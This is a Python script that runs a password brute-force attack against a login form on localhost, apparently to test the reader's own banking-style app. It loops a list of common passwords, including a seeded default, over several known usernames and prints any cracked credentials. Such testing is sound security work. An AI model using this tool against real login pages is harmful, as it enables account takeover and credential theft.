import requests
import time


def try_login(username, password):
    """Attempt to login with given credentials"""
    session = requests.Session()
    response = session.get("http://localhost:5000/login")

    payload = {
        'username': username,
        'password': password
    }

    response = session.post("http://localhost:5000/login", data=payload)
    return "Logged in successfully" in response.text


def brute_force_attack(username, password_list, delay=0.1):
    """Try each password in the list for a single username"""
    print(f"\nStarting brute force attack on username: {username}")
    print(f"Testing {len(password_list)} passwords...")

    start_time = time.time()
    attempts = 0

    for password in password_list:
        attempts += 1
        if attempts % 10 == 0:
            print(f"Tried {attempts} passwords...")

        if try_login(username, password):
            elapsed_time = time.time() - start_time
            print(f"\nSUCCESS! Password found after {attempts} attempts ({elapsed_time:.2f} seconds)")
            print(f"Username: {username}")
            print(f"Password: {password}")
            return password, attempts, elapsed_time

        # Small delay to avoid overwhelming the server
        time.sleep(delay)

    elapsed_time = time.time() - start_time
    print(f"\nFailed after trying {attempts} passwords for {username}")
    return None, attempts, elapsed_time


def attack_users(usernames, password_list, delay=0.1):
    """Test all usernames against the password list"""
    print(f"Starting brute force attack on {len(usernames)} usernames")
    print(f"Password list contains {len(password_list)} passwords")

    results = []
    total_start_time = time.time()

    for username in usernames:
        password, attempts, time_taken = brute_force_attack(username, password_list, delay)
        results.append({
            'username': username,
            'password': password,
            'attempts': attempts,
            'time_taken': time_taken,
            'success': password is not None
        })

    total_time = time.time() - total_start_time

    # Display summary
    print("BRUTE FORCE ATTACK SUMMARY")

    success_count = sum(1 for r in results if r['success'])
    print(f"Total usernames tested: {len(usernames)}")
    print(f"Successfully cracked: {success_count}/{len(usernames)}")
    print(f"Total time elapsed: {total_time:.2f} seconds")


    return results


if __name__ == "__main__":
    # Known usernames from your database
    usernames = [
        "user_409000611074",
        "user_409000493201",
        "user_409000425051",
        "user_1196711",
        "12345678"
    ]

    # List of passwords to try, including DefaultPass123 which is used in your db_init.py
    passwords = [
        "123456", "password", "123456789", "12345578", "12345",
        "qwerty", "abc123", "football", "1234567", "monkey",
        "111111", "letmein", "1234", "1234567890", "dragon",
        "baseball", "sunshine", "iloveyou", "trustno1", "princess",
        "admin", "welcome", "666666", "DefaultPass123", "!QAZ2wsx",
        "password1", "qazwsx", "123qwe", "zxcvbnm", "123456a",
        "bank123", "secure", "money", "finance", "banking"
    ]

    # Attack all usernames
    attack_users(usernames, passwords, delay=0.1)